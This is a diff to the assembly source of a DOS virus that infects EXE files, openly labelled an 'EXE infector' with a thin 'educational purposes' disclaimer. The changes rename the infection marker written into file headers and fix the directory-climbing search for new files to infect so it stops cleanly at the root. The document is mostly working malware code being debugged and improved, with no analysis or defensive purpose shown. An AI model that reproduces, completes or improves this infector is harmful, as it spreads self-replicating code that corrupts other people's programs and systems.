@@ -17,15 +17,14 @@
 ; after assembly. The code was written for educational purposes ONLY.
 ;
 
+	.model tiny
+	.code
+	.startup
 	locals @@
-
-cseg	segment byte public 'code'
-	assume cs:cseg, ds:cseg
-
-	org 100h
+	assume ss:nothing				; this EXE infector runs with SS != DS
 
 VirusSize	equ	EndVirus-BeginVirus
-VirusIdentifier	equ	'Ri'
+ExeMarker	equ	'JG'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
@@ -79,11 +78,17 @@ FindFiles:
 	int	21h
 
 	jnc	OpenFile				; if found a file
-	lea	dx, [bp+DirMask]			; else change directory
+	mov	ah, 47h					; else get current directory
+	xor	dl, dl					; current drive
+	lea	si, [bp+CwdBuf]
+	int	21h
+	cmp	byte ptr [bp+CwdBuf], 0			; at the root? (empty path)
+	jne	@@goup					; not root -> go up
+	jmp	NoMoreFiles				; root: stop (cd .. succeeds at root -> would loop)
+@@goup:	lea	dx, [bp+DirMask]			; go up one directory
 	mov	ah, 3bh
 	int	21h
-	jnc	FindNewFiles
-	jmp	NoMoreFiles				; end of all files
+	jmp	FindNewFiles				; and scan the parent
 
 OpenFile:
 	mov	ax, 3d02h				; open the found file
@@ -109,7 +114,7 @@ CheckIfInfected:
 	add	si, 10h					; saving another byte
 	; lea	si,[bp+ExeHead+12h]
 	lodsw
-	cmp	ax, VirusIdentifier			; is it already infected?
+	cmp	ax, ExeMarker				; is it already infected?
 	jne	InfectFile
 	jmp	CloseFile
 
@@ -123,7 +128,7 @@ InfectFile:
 	movsw
 
 	lea	di, [bp+ExeHead+12h]			; mark the file infected
-	mov	ax, VirusIdentifier
+	mov	ax, ExeMarker
 	stosw
 
 	mov	al, 2h					; go to end_of_file
@@ -275,7 +280,6 @@ EndVirus:
 ExeHead	db	24 dup (?)
 DtaArea	db	43 dup (?)
 SaveDir	db	64 dup (?)
+CwdBuf	db	64 dup (?)
 
-cseg ends
-
-end BeginVirus
+end
